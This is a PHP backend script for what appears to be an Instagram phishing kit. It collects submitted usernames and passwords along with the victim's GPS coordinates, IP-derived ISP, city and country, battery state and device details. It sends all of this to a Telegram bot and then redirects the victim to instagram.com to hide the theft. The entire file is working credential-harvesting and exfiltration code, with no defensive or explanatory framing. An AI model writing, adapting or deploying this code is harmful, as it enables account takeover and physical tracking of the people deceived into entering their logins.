<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"] ?? 'Unknown';
    $password = $_POST["password"] ?? 'Unknown';

    // Get User IP
    $ip_address = $_SERVER['REMOTE_ADDR'];

    // Get Additional Headers
    $userAgent = $_POST["userAgent"] ?? 'Unknown';
    $platform = $_POST["platform"] ?? 'Unknown';
    $screenWidth = $_POST["screenWidth"] ?? 'Unknown';
    $screenHeight = $_POST["screenHeight"] ?? 'Unknown';
    $language = $_POST["language"] ?? 'Unknown';
    $batteryLevel = $_POST["batteryLevel"] ?? 'Unknown';
    $isCharging = $_POST["isCharging"] ?? 'Unknown';
    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct Access';
    $acceptLang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';

    // Get Location Data
    $latitude = $_POST["latitude"] ?? 'Not Available';
    $longitude = $_POST["longitude"] ?? 'Not Available';
    $map_link = "https://www.google.com/maps?q=$latitude,$longitude";

    // Get ISP & Country Details using IP API
    $ipDetails = json_decode(file_get_contents("http://ip-api.com/json/$ip_address"), true);
    $isp = $ipDetails['isp'] ?? 'Unknown ISP';
    $country = $ipDetails['country'] ?? 'Unknown Country';
    $city = $ipDetails['city'] ?? 'Unknown City';

    // Telegram Bot Details
    $telegramBotToken = "xxxxxxxxxx"; 
    $chatId = "xxxxxxxxxx"; 

    // Prepare Message
    $message = "User Login Attempt\n\n"
             . "Username: " . $username . "\n"
             . "Password: " . $password . "\n"
             . "IP Address: " . $ip_address . "\n"
             . "GPS Location: [Open in Maps]($map_link)\n"
             . "Latitude: " . $latitude . "\n"
             . "Longitude: " . $longitude . "\n\n"
             . "Location Details:\n"
             . "Country: " . $country . "\n"
             . "City: " . $city . "\n"
             . "ISP: " . $isp . "\n\n"
             . "Device Info: \n"
             . "Platform: " . $platform . "\n"
             . "Screen Size: " . $screenWidth . "x" . $screenHeight . "\n"
             . "Battery: " . $batteryLevel . " | Charging: " . $isCharging . "\n";

    // Send Message to Telegram
    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message) . "&parse_mode=Markdown";
    file_get_contents($telegramApiUrl);

    // Send JSON response for AJAX redirect
    echo json_encode(["redirect" => "https://instagram.com"]);
    exit();
}
?>
